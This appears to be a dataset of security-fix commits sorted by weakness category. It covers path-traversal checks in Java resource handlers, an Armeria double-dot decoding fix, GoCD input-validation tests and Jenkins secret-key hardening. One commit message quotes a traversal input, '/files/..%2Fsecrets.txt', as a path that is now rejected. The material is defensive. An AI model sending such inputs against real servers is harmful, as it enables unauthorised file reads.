+ * Bottom up linked list merge sort.
+ *
+ */
+void sort_directory(struct dir *dir)
+{
+	struct dir_ent *cur, *l1, *l2, *next;
+	int len1, len2, stride = 1;
+
+	if(dir->dir_count < 2)
+		return;
+
+	/*
+	 * We can consider our linked-list to be made up of stride length
+	 * sublists.  Eacn iteration around this loop merges adjacent
+	 * stride length sublists into larger 2*stride sublists.  We stop
+	 * when stride becomes equal to the entire list.
+	 *
+	 * Initially stride = 1 (by definition a sublist of 1 is sorted), and
+	 * these 1 element sublists are merged into 2 element sublists,  which
+	 * are then merged into 4 element sublists and so on.
+	 */
+	do {
+		l2 = dir->dirs; /* head of current linked list */
+		cur = NULL; /* empty output list */
+
+		/*
+		 * Iterate through the linked list, merging adjacent sublists.
+		 * On each interation l2 points to the next sublist pair to be
+		 * merged (if there's only one sublist left this is simply added
+		 * to the output list)
+		 */
+		while(l2) {
+			l1 = l2;
+			for(len1 = 0; l2 && len1 < stride; len1 ++, l2 = l2->next);
+			len2 = stride;
+
+			/*
+			 * l1 points to first sublist.
+			 * l2 points to second sublist.
+			 * Merge them onto the output list
+			 */
+			while(len1 && l2 && len2) {
+				if(strcmp(l1->name, l2->name) <= 0) {
+					next = l1;
+					l1 = l1->next;
+					len1 --;
+				} else {
+					next = l2;
+					l2 = l2->next;
+					len2 --;
+				}
+
+				if(cur) {
+					cur->next = next;
+					cur = next;
+				} else
+					dir->dirs = cur = next;
+			}
+			/*
+			 * One sublist is now empty, copy the other one onto the
+			 * output list
+			 */
+			for(; len1; len1 --, l1 = l1->next) {
+				if(cur) {
+					cur->next = l1;
+					cur = l1;
+				} else
+					dir->dirs = cur = l1;
+			}
+			for(; l2 && len2; len2 --, l2 = l2->next) {
+				if(cur) {
+					cur->next = l2;
+					cur = l2;
+				} else
+					dir->dirs = cur = l2;
+			}
+		}
+		cur->next = NULL;
+		stride = stride << 1;
+	} while(stride < dir->dir_count);
+}

Code after:
/*
 * Unsquash a squashfs filesystem.  This is a highly compressed read only
 * filesystem.
 *
 * Copyright (c) 2021
 * Phillip Lougher <phillip@squashfs.org.uk>
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2,
 * or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 *
 * unsquash-12.c
 *
 * Helper functions used by unsquash-1 and unsquash-2.
 */

#include "unsquashfs.h"

/*
 * Bottom up linked list merge sort.
 *
 */
void sort_directory(struct dir *dir)
{
	struct dir_ent *cur, *l1, *l2, *next;
	int len1, len2, stride = 1;

	if(dir->dir_count < 2)
		return;

	/*
	 * We can consider our linked-list to be made up of stride length
	 * sublists.  Eacn iteration around this loop merges adjacent
	 * stride length sublists into larger 2*stride sublists.  We stop
	 * when stride becomes equal to the entire list.
	 *
	 * Initially stride = 1 (by definition a sublist of 1 is sorted), and
	 * these 1 element sublists are merged into 2 element sublists,  which
	 * are then merged into 4 element sublists and so on.
	 */
	do {
		l2 = dir->dirs; /* head of current linked list */
		cur = NULL; /* empty output list */

		/*
		 * Iterate through the linked list, merging adjacent sublists.
		 * On each interation l2 points to the next sublist pair to be
		 * merged (if there's only one sublist left this is simply added
		 * to the output list)
		 */
		while(l2) {
			l1 = l2;
			for(len1 = 0; l2 && len1 < stride; len1 ++, l2 = l2->next);
			len2 = stride;

			/*
			 * l1 points to first sublist.
			 * l2 points to second sublist.
			 * Merge them onto the output list
			 */
			while(len1 && l2 && len2) {
				if(strcmp(l1->name, l2->name) <= 0) {
					next = l1;
					l1 = l1->next;
					len1 --;
				} else {
					next = l2;
					l2 = l2->next;
					len2 --;
				}

				if(cur) {
					cur->next = next;
					cur = next;
				} else
					dir->dirs = cur = next;
			}
			/*
			 * One sublist is now empty, copy the other one onto the
			 * output list
			 */
			for(; len1; len1 --, l1 = l1->next) {
				if(cur) {
					cur->next = l1;
					cur = l1;
				} else
					dir->dirs = cur = l1;
			}
			for(; l2 && len2; len2 --, l2 = l2->next) {
				if(cur) {
					cur->next = l2;
					cur = l2;
				} else
					dir->dirs = cur = l2;
			}
		}
		cur->next = NULL;
		stride = stride << 1;
	} while(stride < dir->dir_count);
}


--------------------
Filename: ResourceManager.java
Message: fixing CTS failure issue in master branch

Diff: @@ -565,7 +565,7 @@ public class ResourceManager {
         
         localePrefix = context.getExternalContext().getRequestParameterMap().get("loc");
         
-        if(localePrefix != null){
+        if(localePrefix != null && !nameContainsForbiddenSequence(localePrefix)){
             return localePrefix;
         }
         

Code after:
     * </p>
     *
     * @param context the {@link FacesContext} for the current request
     * @return the localePrefix based on the current request, or <code>null</code>
     *  if no prefix can be determined
     */
    private String getLocalePrefix(FacesContext context) {

        String localePrefix = null;
        
        localePrefix = context.getExternalContext().getRequestParameterMap().get("loc");
        
        if(localePrefix != null && !nameContainsForbiddenSequence(localePrefix)){
            return localePrefix;
        }
        
        String appBundleName = context.getApplication().getMessageBundle();
        if (null != appBundleName) {
        	
            Locale locale = null;
            if (context.getViewRoot() != null) {
                locale = context.getViewRoot().getLocale();
            } else {
                locale = context.getApplication().getViewHandler().calculateLocale(context);
            }
            
                try {


--------------------
Filename: ClasspathResourceHelper.java
Message: Multiple Path Traversal security issues

Diff: @@ -355,7 +355,7 @@ public class ClasspathResourceHelper extends ResourceHelper {
         } else if (root == null) {
             String contractName = ctx.getExternalContext().getRequestParameterMap()
                   .get("con");
-            if (null != contractName && 0 < contractName.length()) {
+            if (null != contractName && 0 < contractName.length() && !ResourceManager.nameContainsForbiddenSequence(contractName)) {
                 contracts = new ArrayList<>();
                 contracts.add(contractName);
             } else {

Code after:
        URL result = null;
        
        if (library != null) {
            if(library.getContract() == null) {
                contracts = Collections.emptyList();
            } else {
                contracts = new ArrayList<String>(1);
                contracts.add(library.getContract());
            }
        } else if (root == null) {
            String contractName = ctx.getExternalContext().getRequestParameterMap()
                  .get("con");
            if (null != contractName && 0 < contractName.length() && !ResourceManager.nameContainsForbiddenSequence(contractName)) {
                contracts = new ArrayList<>();
                contracts.add(contractName);
            } else {
                return null;
            }
        } else {
       		contracts = ctx.getResourceLibraryContracts();
        }

        String basePath = null;
        
        for (String curContract : contracts) {
        
            if (library != null) {


--------------------
Filename: WebappResourceHelper.java
Message: Multiple Path Traversal security issues

Diff: @@ -315,7 +315,7 @@ public class WebappResourceHelper extends ResourceHelper {
         } else if (root == null) {
             String contractName = ctx.getExternalContext().getRequestParameterMap()
                   .get("con");
-            if (null != contractName && 0 < contractName.length()) {
+            if (null != contractName && 0 < contractName.length() && !ResourceManager.nameContainsForbiddenSequence(contractName)) {
                 contracts = new ArrayList<>();
                 contracts.add(contractName);
             } else {

Code after:
        List<String> contracts = null;

        if (library != null) {
            if(library.getContract() == null) {
                contracts = Collections.emptyList();
            } else {
                contracts = new ArrayList<String>(1);
                contracts.add(library.getContract());
            }
        } else if (root == null) {
            String contractName = ctx.getExternalContext().getRequestParameterMap()
                  .get("con");
            if (null != contractName && 0 < contractName.length() && !ResourceManager.nameContainsForbiddenSequence(contractName)) {
                contracts = new ArrayList<>();
                contracts.add(contractName);
            } else {
                return null;
            }
        } else {
        	contracts = ctx.getResourceLibraryContracts();
        }

        String basePath = null;
        
        for (String curContract : contracts) {
        
            if (library != null) {


--------------------
Filename: RoutingResultBuilder.java
Message: Merge pull request from GHSA-8fp4-rp6c-5gcv

Motivation:

- We changed how `PathAndQuery` handles `%2F` (/) in 1.12.0 via #3855.
  This change introduces an unexpected hole in its double-dot detection
  logic.
- Since we decided not to decode `%2F`, we should not decode it
  whereever possible.

Modifications:

- Hardened the double-dot detection logic in `PathAndQuery`.
- `Bytes.data` now always store the bytes in their decoded form. We keep
  whether the byte has to be encoded in a separate `BitSet`.
- Split `ArmeriaHttpUtil.decodePath()` into `decodePath()` and
  `decodePathParam()`.
  - We don't decode `%2F` in `decodePath()` but we do in
    `decodePathParam()`.
  - `RoutingResultBuilder.rawParam()` now uses `decodePathParam()`
    because `decodePath()` doesn't decode `%2F` anymore.

Result:

- A path that contains double dots with `%2F`, such as
  `/files/..%2Fsecrets.txt`, are now rejected correctly.

Diff: @@ -96,7 +96,7 @@ public final class RoutingResultBuilder {
      */
     public RoutingResultBuilder rawParam(String name, String value) {
         pathParams().put(requireNonNull(name, "name"),
-                         ArmeriaHttpUtil.decodePath(requireNonNull(value, "value")));
+                         ArmeriaHttpUtil.decodePathParam(requireNonNull(value, "value")));
         return this;
     }
 

Code after:
     * Adds a decoded path parameter.
     */
    public RoutingResultBuilder decodedParam(String name, String value) {
        pathParams().put(requireNonNull(name, "name"), requireNonNull(value, "value"));
        return this;
    }

    /**
     * Adds an encoded path parameter, which will be decoded in UTF-8 automatically.
     */
    public RoutingResultBuilder rawParam(String name, String value) {
        pathParams().put(requireNonNull(name, "name"),
                         ArmeriaHttpUtil.decodePathParam(requireNonNull(value, "value")));
        return this;
    }

    /**
     * Sets the score.
     */
    public RoutingResultBuilder score(int score) {
        this.score = score;
        return this;
    }

    /**
     * Sets the negotiated producible {@link MediaType}.
     */


--------------------
Filename: DataFileTools.java
Message: Don't allow filepaths as Filename when requesting source files

Diff: @@ -186,6 +186,8 @@ public class DataFileTools {
      */
     public static Path getDataFilePath(String pi, String dataFolderName, String altDataFolderName, String fileName)
             throws PresentationException, IndexUnreachableException {
+        //make sure fileName is a pure filename and not a path
+        fileName = Paths.get(fileName).getFileName().toString();
         java.nio.file.Path dataFolderPath = getDataFolder(pi, dataFolderName);
         if (StringUtils.isNotBlank(fileName)) {
             dataFolderPath = dataFolderPath.resolve(fileName);

Code after:
     * </p>
     *
     * @param pi Record identifier
     * @param dataFolderName Name of the data folder (e.g. 'alto') - first choice
     * @param altDataFolderName Name of the data folder - second choice
     * @param fileName Name of the content file
     * @return Path to the requested file
     * @throws io.goobi.viewer.exceptions.PresentationException if any.
     * @throws io.goobi.viewer.exceptions.IndexUnreachableException if any.
     */
    public static Path getDataFilePath(String pi, String dataFolderName, String altDataFolderName, String fileName)
            throws PresentationException, IndexUnreachableException {
        //make sure fileName is a pure filename and not a path
        fileName = Paths.get(fileName).getFileName().toString();
        java.nio.file.Path dataFolderPath = getDataFolder(pi, dataFolderName);
        if (StringUtils.isNotBlank(fileName)) {
            dataFolderPath = dataFolderPath.resolve(fileName);
        }
        if (StringUtils.isNotBlank(altDataFolderName) && !Files.exists(dataFolderPath)) {
            return getDataFilePath(pi, altDataFolderName, null, fileName);
        }

        return dataFolderPath;
    }

    /**
     * <p>
     * getDataFilePath.


--------------------
Filename: ArtifactsControllerTest.java
Message: #000 - Validate stage counter in GETs as well.

Continuation of commit c22e0428164af

Diff: @@ -136,6 +136,18 @@ public class ArtifactsControllerTest {
         assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
     }
 
+    @Test
+    void shouldFailToGetConsoleOutWhenStageCounterIsNotAPositiveInteger() throws Exception {
+        ModelAndView modelAndView = artifactsController.consoleout("pipeline-1", "1", "stage-1", "job-1", "NOT_AN_INTEGER", 122L);
+        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
+    }
+
+    @Test
+    void shouldFailToGetArtifactWhenStageCounterIsNotAPositiveInteger() throws Exception {
+        ModelAndView modelAndView = artifactsController.getArtifactAsHtml("pipeline-1", "1", "stage-1",  "NOT_AN_INTEGER", "job-1", "some-path", "sha1", "alias");
+        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
+    }
+
     @Test
     public void shouldFunnelAll_GET_calls() throws Exception {
         final ModelAndView returnVal = new ModelAndView();

Code after:
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));

        modelAndView = artifactsController.postArtifact("pipeline-1", "1", "stage-1", "-123", "job-1", 122L, "some-path", 1, null);
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));

        modelAndView = artifactsController.putArtifact("pipeline-1", "1", "stage-1", "NOT_AN_INTEGER", "job-1", 122L, "some-path", "1", null);
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));

        modelAndView = artifactsController.putArtifact("pipeline-1", "1", "stage-1", "-123", "job-1", 122L, "some-path", "1", null);
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
    }

    @Test
    void shouldFailToGetConsoleOutWhenStageCounterIsNotAPositiveInteger() throws Exception {
        ModelAndView modelAndView = artifactsController.consoleout("pipeline-1", "1", "stage-1", "job-1", "NOT_AN_INTEGER", 122L);
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
    }

    @Test
    void shouldFailToGetArtifactWhenStageCounterIsNotAPositiveInteger() throws Exception {
        ModelAndView modelAndView = artifactsController.getArtifactAsHtml("pipeline-1", "1", "stage-1",  "NOT_AN_INTEGER", "job-1", "some-path", "sha1", "alias");
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
    }

    @Test
    public void shouldFunnelAll_GET_calls() throws Exception {
        final ModelAndView returnVal = new ModelAndView();
        ArtifactsController controller = new ArtifactsController(artifactService, restfulService, mock(ZipArtifactCache.class), jobInstanceDao, consoleActivityMonitor, consoleService, systemEnvironment) {
            @Override
            ModelAndView getArtifact(String filePath, ArtifactFolderViewFactory folderViewFactory, String pipelineName, String counterOrLabel, String stageName, String stageCounter,
                                     String buildName, String sha, String serverAlias) throws Exception {
                return returnVal;
            }
        };

        assertThat(controller.getArtifactAsHtml("pipeline", "counter", "stage", "2", "job", "file_name", "sha1", null), sameInstance(returnVal));
        assertThat(controller.getArtifactAsZip("pipeline", "counter", "stage", "2", "job", "file_name", "sha1"), sameInstance(returnVal));
        assertThat(controller.getArtifactAsJson("pipeline", "counter", "stage", "2", "job", "file_name", "sha1"), sameInstance(returnVal));


--------------------
Filename: ArtifactsControllerTest.java
Message: #000 - Validate stage counter in GETs as well.

Continuation of commit c22e0428164af

Diff: @@ -136,6 +136,18 @@ public class ArtifactsControllerTest {
         assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
     }
 
+    @Test
+    void shouldFailToGetConsoleOutWhenStageCounterIsNotAPositiveInteger() throws Exception {
+        ModelAndView modelAndView = artifactsController.consoleout("pipeline-1", "1", "stage-1", "job-1", "NOT_AN_INTEGER", 122L);
+        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
+    }
+
+    @Test
+    void shouldFailToGetArtifactWhenStageCounterIsNotAPositiveInteger() throws Exception {
+        ModelAndView modelAndView = artifactsController.getArtifactAsHtml("pipeline-1", "1", "stage-1",  "NOT_AN_INTEGER", "job-1", "some-path", "sha1", "alias");
+        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
+    }
+
     @Test
     public void shouldFunnelAll_GET_calls() throws Exception {
         final ModelAndView returnVal = new ModelAndView();

Code after:
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));

        modelAndView = artifactsController.postArtifact("pipeline-1", "1", "stage-1", "-123", "job-1", 122L, "some-path", 1, null);
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));

        modelAndView = artifactsController.putArtifact("pipeline-1", "1", "stage-1", "NOT_AN_INTEGER", "job-1", 122L, "some-path", "1", null);
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));

        modelAndView = artifactsController.putArtifact("pipeline-1", "1", "stage-1", "-123", "job-1", 122L, "some-path", "1", null);
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
    }

    @Test
    void shouldFailToGetConsoleOutWhenStageCounterIsNotAPositiveInteger() throws Exception {
        ModelAndView modelAndView = artifactsController.consoleout("pipeline-1", "1", "stage-1", "job-1", "NOT_AN_INTEGER", 122L);
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
    }

    @Test
    void shouldFailToGetArtifactWhenStageCounterIsNotAPositiveInteger() throws Exception {
        ModelAndView modelAndView = artifactsController.getArtifactAsHtml("pipeline-1", "1", "stage-1",  "NOT_AN_INTEGER", "job-1", "some-path", "sha1", "alias");
        assertThat(((ResponseCodeView) modelAndView.getView()).getStatusCode(), is(SC_NOT_FOUND));
    }

    @Test
    public void shouldFunnelAll_GET_calls() throws Exception {
        final ModelAndView returnVal = new ModelAndView();
        ArtifactsController controller = new ArtifactsController(artifactService, restfulService, mock(ZipArtifactCache.class), jobInstanceDao, consoleActivityMonitor, consoleService, systemEnvironment) {
            @Override
            ModelAndView getArtifact(String filePath, ArtifactFolderViewFactory folderViewFactory, String pipelineName, String counterOrLabel, String stageName, String stageCounter,
                                     String buildName, String sha, String serverAlias) throws Exception {
                return returnVal;
            }
        };

        assertThat(controller.getArtifactAsHtml("pipeline", "counter", "stage", "2", "job", "file_name", "sha1", null), sameInstance(returnVal));
        assertThat(controller.getArtifactAsZip("pipeline", "counter", "stage", "2", "job", "file_name", "sha1"), sameInstance(returnVal));
        assertThat(controller.getArtifactAsJson("pipeline", "counter", "stage", "2", "job", "file_name", "sha1"), sameInstance(returnVal));


--------------------
Filename: AbstractResourceSkin.java
Message: XWIKI-19349: Bad handling of classloader templates path resolution

Diff: @@ -142,7 +142,7 @@ private String getSkinResourcePath(String resource)
         String skinFolder = getSkinFolder();
         String resourcePath = skinFolder + resource;
 
-        // Prevent inclusion of templates from other directories
+        // Prevent access to resources from other directories
         Path normalizedResource = Paths.get(resourcePath).normalize();
         // Protect against directory attacks.
         if (!normalizedResource.startsWith(skinFolder)) {

Code after:
                this.properties = new BaseConfiguration();
            }
        }

        return this.properties;
    }

    private String getSkinResourcePath(String resource)
    {
        String skinFolder = getSkinFolder();
        String resourcePath = skinFolder + resource;

        // Prevent access to resources from other directories
        Path normalizedResource = Paths.get(resourcePath).normalize();
        // Protect against directory attacks.
        if (!normalizedResource.startsWith(skinFolder)) {
            LOGGER.warn("Direct access to skin file [{}] refused. Possible break-in attempt!", normalizedResource);
            return null;
        }

        return resourcePath;
    }
}


--------------------

********************
NVD-CWE-noinfo: Insufficient Information (32 samples)
********************
Filename: DNSMultiCast.java
Message: [SECURITY-49] Deprecating Jenkins.getSecretKey()

We are replacing it by the ConfidentialStore class and the
ConfidentialKey class, which provides purpose-specific confidential
information that are separated from each other.

In this way, not all eggs are in one basket, and in case of a
compromise, the impact will contained.

Also replaced several insecure use of digest(secret|messsage) or
digest(message|secret) by HMAC.

Diff: @@ -46,7 +46,7 @@ public class DNSMultiCast implements Closeable {
                     if (tal!=null)
                         props.put("slave-port",String.valueOf(tal.getPort()));
 
-                    props.put("server-id", Util.getDigestOf(jenkins.getSecretKey()));
+                    props.put("server-id", jenkins.getLegacyInstanceId());
 
                     URL jenkins_url = new URL(rootURL);
                     int jenkins_port = jenkins_url.getPort();

Code after:

                    props.put("url", rootURL);
                    try {
                        props.put("version",String.valueOf(Jenkins.getVersion()));
                    } catch (IllegalArgumentException e) {
                        // failed to parse the version number
                    }

                    TcpSlaveAgentListener tal = jenkins.getTcpSlaveAgentListener();
                    if (tal!=null)
                        props.put("slave-port",String.valueOf(tal.getPort()));

                    props.put("server-id", jenkins.getLegacyInstanceId());

                    URL jenkins_url = new URL(rootURL);
                    int jenkins_port = jenkins_url.getPort();
                    if (jenkins_port == -1) {
                        jenkins_port = 80;
                    }
                    if (jenkins_url.getPath().length() > 0) {
                        props.put("path", jenkins_url.getPath());
                    }

                    jmdns.registerService(ServiceInfo.create("_hudson._tcp.local.","jenkins",
                            jenkins_port,0,0,props));	// for backward compatibility
                    jmdns.registerService(ServiceInfo.create("_jenkins._tcp.local.","jenkins",
                            jenkins_port,0,0,props));


--------------------
Filename: UDPBroadcastThread.java
Message: [SECURITY-49] Deprecating Jenkins.getSecretKey()

We are replacing it by the ConfidentialStore class and the
ConfidentialKey class, which provides purpose-specific confidential
information that are separated from each other.

In this way, not all eggs are in one basket, and in case of a
compromise, the impact will contained.

Also replaced several insecure use of digest(secret|messsage) or
digest(message|secret) by HMAC.

Diff: @@ -86,7 +86,7 @@ public class UDPBroadcastThread extends Thread {
                 StringBuilder rsp = new StringBuilder("<hudson>");
                 tag(rsp,"version", Jenkins.VERSION);
                 tag(rsp,"url", jenkins.getRootUrl());
-                tag(rsp,"server-id", Util.getDigestOf(jenkins.getSecretKey()));
+                tag(rsp,"server-id", jenkins.getLegacyInstanceId());
                 tag(rsp,"slave-port",tal==null?null:tal.getPort());
 
                 for (UDPBroadcastFragment f : UDPBroadcastFragment.all())

Code after:
                byte[] buf = new byte[2048];
                DatagramPacket p = new DatagramPacket(buf,buf.length);
                mcs.receive(p);

                SocketAddress sender = p.getSocketAddress();

                // prepare a response
                TcpSlaveAgentListener tal = jenkins.getTcpSlaveAgentListener();

                StringBuilder rsp = new StringBuilder("<hudson>");
                tag(rsp,"version", Jenkins.VERSION);
                tag(rsp,"url", jenkins.getRootUrl());
                tag(rsp,"server-id", jenkins.getLegacyInstanceId());
                tag(rsp,"slave-port",tal==null?null:tal.getPort());

                for (UDPBroadcastFragment f : UDPBroadcastFragment.all())
                    f.buildFragment(rsp,sender);

                rsp.append("</hudson>");

                byte[] response = rsp.toString().getBytes("UTF-8");
                mcs.send(new DatagramPacket(response,response.length,sender));
            }
        } catch (ClosedByInterruptException e) {
            // shut down
        } catch (BindException e) {
            // if we failed to listen to UDP, just silently abandon it, as a stack trace


--------------------
Filename: DefaultCrumbIssuer.java
Message: [SECURITY-49] Deprecating Jenkins.getSecretKey()

We are replacing it by the ConfidentialStore class and the
ConfidentialKey class, which provides purpose-specific confidential
information that are separated from each other.

In this way, not all eggs are in one basket, and in case of a
compromise, the impact will contained.

Also replaced several insecure use of digest(secret|messsage) or
digest(message|secret) by HMAC.

Diff: @@ -118,7 +118,8 @@ public class DefaultCrumbIssuer extends CrumbIssuer {
     public static final class DescriptorImpl extends CrumbIssuerDescriptor<DefaultCrumbIssuer> implements ModelObject {
 
         public DescriptorImpl() {
-            super(Jenkins.getInstance().getSecretKey(), System.getProperty("hudson.security.csrf.requestfield", ".crumb"));
+            // salt just needs to be unique, and it doesn't have to be a secret
+            super(Jenkins.getInstance().getLegacyInstanceId(), System.getProperty("hudson.security.csrf.requestfield", ".crumb"));
             load();
         }
 

Code after:
	        String[] hopList = forwarded.split(",");
            if (hopList.length >= 1) {
                return hopList[0];
            }
        }
        return defaultAddress;
    }
    
    @Extension
    public static final class DescriptorImpl extends CrumbIssuerDescriptor<DefaultCrumbIssuer> implements ModelObject {

        public DescriptorImpl() {
            // salt just needs to be unique, and it doesn't have to be a secret
            super(Jenkins.getInstance().getLegacyInstanceId(), System.getProperty("hudson.security.csrf.requestfield", ".crumb"));
            load();
        }

        @Override
        public String getDisplayName() {
            return Messages.DefaultCrumbIssuer_DisplayName();
        }

        @Override
        public DefaultCrumbIssuer newInstance(StaplerRequest req, JSONObject formData) throws FormException {
            return req.bindJSON(DefaultCrumbIssuer.class, formData);
        }
    }
    


--------------------
Filename: DefaultConfidentialStore.java
Message: [SECURITY-49] Deprecating Jenkins.getSecretKey()

We are replacing it by the ConfidentialStore class and the
ConfidentialKey class, which provides purpose-specific confidential
information that are separated from each other.

In this way, not all eggs are in one basket, and in case of a
compromise, the impact will contained.

Also replaced several insecure use of digest(secret|messsage) or
digest(message|secret) by HMAC.

Diff: @@ -0,0 +1,145 @@
+package jenkins.security;
+
+import hudson.Extension;
+import hudson.FilePath;
+import hudson.Util;
+import hudson.util.IOException2;
+import hudson.util.IOUtils;
+import hudson.util.Secret;
+import hudson.util.TextFile;
+import jenkins.model.Jenkins;
+
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.CipherOutputStream;
+import javax.crypto.SecretKey;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.security.GeneralSecurityException;
+import java.security.SecureRandom;
+
+/**
+ * Default portable implementation of {@link ConfidentialStore} that uses
+ * a directory inside $JENKINS_HOME.
+ *
+ * The master key is also stored in this same directory.
+ *
+ * @author Kohsuke Kawaguchi
+ */
+@Extension(ordinal=-99999) // small ordinal value to allow other higher ones to take over
+public class DefaultConfidentialStore extends ConfidentialStore {
+    private final SecureRandom sr = new SecureRandom();
+
+    /**
+     * Directory that stores individual keys.
+     */
+    private final File rootDir;
+
+    /**
+     * The master key.
+     *
+     * The sole purpose of the master key is to encrypt individual keys on the disk.
+     * Because leaking this master key compromises all the individual keys, we must not let
+     * this master key used for any other purpose, hence the protected access.
+     */
+    private final SecretKey masterKey;
+
+    public DefaultConfidentialStore() throws IOException, InterruptedException {
+        this(new File(Jenkins.getInstance().getRootDir(),"secrets"));
+    }
+
+    public DefaultConfidentialStore(File rootDir) throws IOException, InterruptedException {
+        this.rootDir = rootDir;
+        if (rootDir.mkdirs()) {
+            // protect this directory. but don't change the permission of the existing directory
+            // in case the administrator changed this.
+            new FilePath(rootDir).chmod(0700);
+        }
+
+        TextFile masterSecret = new TextFile(new File(rootDir,"master.key"));
+        if (!masterSecret.exists()) {
+            // we are only going to use small number of bits (since export control limits AES key length)
+            // but let's generate a long enough key anyway
+            masterSecret.write(Util.toHexString(randomBytes(128)));
+        }
+        this.masterKey = Util.toAes128Key(masterSecret.readTrim());
+    }
+
+    /**
+     * Persists the payload of {@link ConfidentialKey} to the disk.
+     */
+    @Override
+    protected void store(ConfidentialKey key, byte[] payload) throws IOException {
+        CipherOutputStream cos=null;
+        FileOutputStream fos=null;
+        try {
+            Cipher sym = Secret.getCipher("AES");
+            sym.init(Cipher.ENCRYPT_MODE, masterKey);
+            cos = new CipherOutputStream(fos=new FileOutputStream(getFileFor(key)), sym);
+            cos.write(payload);
+            cos.write(MAGIC);
+        } catch (GeneralSecurityException e) {
+            throw new IOException2("Failed to persist the key: "+key.getId(),e);
+        } finally {
+            IOUtils.closeQuietly(cos);
+            IOUtils.closeQuietly(fos);
+        }
+    }
+
+    /**
+     * Reverse operation of {@link #store(ConfidentialKey, byte[])}
+     *
+     * @return
+     *      null the data has not been previously persisted.
+     */
+    @Override
+    protected byte[] load(ConfidentialKey key) throws IOException {
+        CipherInputStream cis=null;
+        FileInputStream fis=null;
+        try {
+            File f = getFileFor(key);
+            if (!f.exists())    return null;
+
+            Cipher sym = Secret.getCipher("AES");
+            sym.init(Cipher.DECRYPT_MODE, masterKey);
+            cis = new CipherInputStream(fis=new FileInputStream(f), sym);
+            byte[] bytes = IOUtils.toByteArray(cis);
+            return verifyMagic(bytes);
+        } catch (GeneralSecurityException e) {
+            throw new IOException2("Failed to persist the key: "+key.getId(),e);
+        } finally {
+            IOUtils.closeQuietly(cis);
+            IOUtils.closeQuietly(fis);
+        }
+    }
+
+    /**
+     * Verifies that the given byte[] has the MAGIC trailer, to verify the integrity of the decryption process.
+     */
+    private byte[] verifyMagic(byte[] payload) {
+        int payloadLen = payload.length-MAGIC.length;
+        if (payloadLen<0)   return null;    // obviously broken
+
+        for (int i=0; i<MAGIC.length; i++) {
+            if (payload[payloadLen+i]!=MAGIC[i])
+                return null;    // broken
+        }
+        byte[] truncated = new byte[payloadLen];
+        System.arraycopy(payload,0,truncated,0,truncated.length);
+        return truncated;
+    }
+
+    private File getFileFor(ConfidentialKey key) {
+        return new File(rootDir, key.getId());
+    }
+
+    public byte[] randomBytes(int size) {
+        byte[] random = new byte[size];
+        sr.nextBytes(random);
+        return random;
+    }
+
+    private static final byte[] MAGIC = "::::MAGIC::::".getBytes();
+}

Code after:
package jenkins.security;

import hudson.Extension;
import hudson.FilePath;
import hudson.Util;
import hudson.util.IOException2;
import hudson.util.IOUtils;
import hudson.util.Secret;
import hudson.util.TextFile;
import jenkins.model.Jenkins;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.CipherOutputStream;
import javax.crypto.SecretKey;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.GeneralSecurityException;
import java.security.SecureRandom;

/**
 * Default portable implementation of {@link ConfidentialStore} that uses
 * a directory inside $JENKINS_HOME.
 *
 * The master key is also stored in this same directory.
 *
 * @author Kohsuke Kawaguchi
 */
@Extension(ordinal=-99999) // small ordinal value to allow other higher ones to take over
public class DefaultConfidentialStore extends ConfidentialStore {
    private final SecureRandom sr = new SecureRandom();

    /**
     * Directory that stores individual keys.
     */
    private final File rootDir;

    /**
     * The master key.
     *
     * The sole purpose of the master key is to encrypt individual keys on the disk.
     * Because leaking this master key compromises all the individual keys, we must not let
     * this master key used for any other purpose, hence the protected access.
     */
    private final SecretKey masterKey;

    public DefaultConfidentialStore() throws IOException, InterruptedException {
        this(new File(Jenkins.getInstance().getRootDir(),"secrets"));
    }

    public DefaultConfidentialStore(File rootDir) throws IOException, InterruptedException {
        this.rootDir = rootDir;
        if (rootDir.mkdirs()) {
            // protect this directory. but don't change the permission of the existing directory
            // in case the administrator changed this.
            new FilePath(rootDir).chmod(0700);
        }

        TextFile masterSecret = new TextFile(new File(rootDir,"master.key"));
        if (!masterSecret.exists()) {
            // we are only going to use small number of bits (since export control limits AES key length)
            // but let's generate a long enough key anyway
            masterSecret.write(Util.toHexString(randomBytes(128)));
        }
